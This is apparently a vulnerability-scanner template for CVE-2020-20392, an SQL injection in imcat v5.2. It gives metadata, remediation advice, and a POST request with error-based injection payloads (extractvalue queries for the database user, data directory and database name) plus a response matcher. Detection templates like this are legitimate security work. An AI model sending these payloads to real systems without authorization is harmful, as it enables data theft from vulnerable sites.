id: CVE-2020-20392

info:
  name: SQL Injection in imcat v5.2
  author: ProjectDiscoveryAI
  severity: critical
  description: SQL Injection vulnerability in imcat v5.2 via the fm[auser] parameters in coms/add_coms.php.
  impact: |
    Allows attackers to execute arbitrary SQL queries, potentially leading to data leakage or data manipulation.
  remediation: |
    Implement input validation and use parameterized queries to prevent SQL Injection attacks.
  reference:
    - https://github.com/peacexie/imcat/issues/5
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2020-20392
    cwe-id: CWE-89
    epss-score: 0.00212
    epss-percentile: 0.59915
    cpe: cpe:2.3:a:txjia:imcat:5.2:*:*:*:*:*:*:*
  metadata:
    vendor: txjia
    product: imcat

http:
  - method: POST
    path:
      - "{{BaseURL}}/chn.php?crem&pid=2015-9h-n441"

    headers:
      Content-Type: application/x-www-form-urlencoded

    body: |
      fm[auser]='and/**/extractvalue('anything',concat('~',(select user())))and'&otherparam=value
      fm[auser]='and/**/extractvalue('anything',concat('~',(select @@datadir)))and'&otherparam=value
      fm[auser]='and/**/extractvalue('anything',concat('~',(select database())))and'&otherparam=value
    matchers:
      - type: word
        words:
          - "XPATH syntax error"
          - "Duplicate entry"
        part: body
